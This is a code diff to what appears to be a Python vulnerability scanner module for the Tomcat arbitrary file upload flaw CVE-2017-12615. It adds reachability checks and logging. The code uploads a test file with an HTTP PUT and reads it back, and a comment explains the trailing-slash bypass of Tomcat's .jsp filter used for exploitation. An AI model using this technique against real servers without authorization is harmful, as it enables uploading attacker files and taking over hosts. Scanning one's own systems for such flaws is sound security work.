@@ -1,12 +1,15 @@
 # coding:utf-8
 
 import requests 
-
+from core.common import url_life,gen_domain_url,logging_message
+from requests.exceptions import ConnectionError
 """
 漏洞名称：Tomcat任意文件上传漏洞 CVE-2017-12615
 
 漏洞范围:tomcat 5.x-9.x
 """
+
+vuln_name = "Tomcat任意文件上传漏洞"
 
 def tomcat_put_rwf_scan(url,path = "/google_hacker_est.txt/",payload = "Z29vZ2xlX2hhY2tlcl9lc3Q="):
     """
@@ -16,6 +19,11 @@ def tomcat_put_rwf_scan(url,path = "/google_hacker_est.txt/",payload = "Z29vZ2xl
     区别只在于，该漏洞的利用是通过末尾的"/"来绕过tomcat对".jsp"的拦截检测的(当然windows下末尾::$DATA也能绕过，但是以/结尾能同时运行在linux和windows两种系统上，这种利用手法更具普适性)    
     而scan时仅上传txt文件，并不会触发拦截，所以末尾没有/也没有关系，而exploit阶段就一定要以/结尾了
     """
+    if url_life(gen_domain_url(url)) == True:
+        pass
+    else:
+        return "unreach"
+
     if url.endswith("/"):
         url += path[1:]
     else:
@@ -24,14 +32,21 @@ def tomcat_put_rwf_scan(url,path = "/google_hacker_est.txt/",payload = "Z29vZ2xl
     urld = url[:-1]
 
     body = payload
-    res = requests.put(url,data=body)
-    if res.status_code == 204 or res.status_code == 201 :
-        req = requests.get(urld)
-        if req.status_code == 200:
-            return True
-        else :
+    try:
+        res = requests.put(url,data=body)
+        if res.status_code == 204 or res.status_code == 201 :
+            req = requests.get(urld)
+            if req.status_code == 200:
+                logging_message("info","{} 存在 {} ".format(url,vuln_name))
+                return True
+            else :
+                logging_message("WARNING","{} 疑似存在 {} ，但验证失败，请手动验证".format(url,vuln_name))
+                return False
+        else:
+            logging_message("info","{} 不存在 {} ".format(url,vuln_name))
             return False
-    else:
+    except ConnectionError:
+        logging_message("info","{} 访问出错，大概率不存在{}".format(url,vuln_name))
         return False
 
 def tomcat_put_rwf_exploit(url):
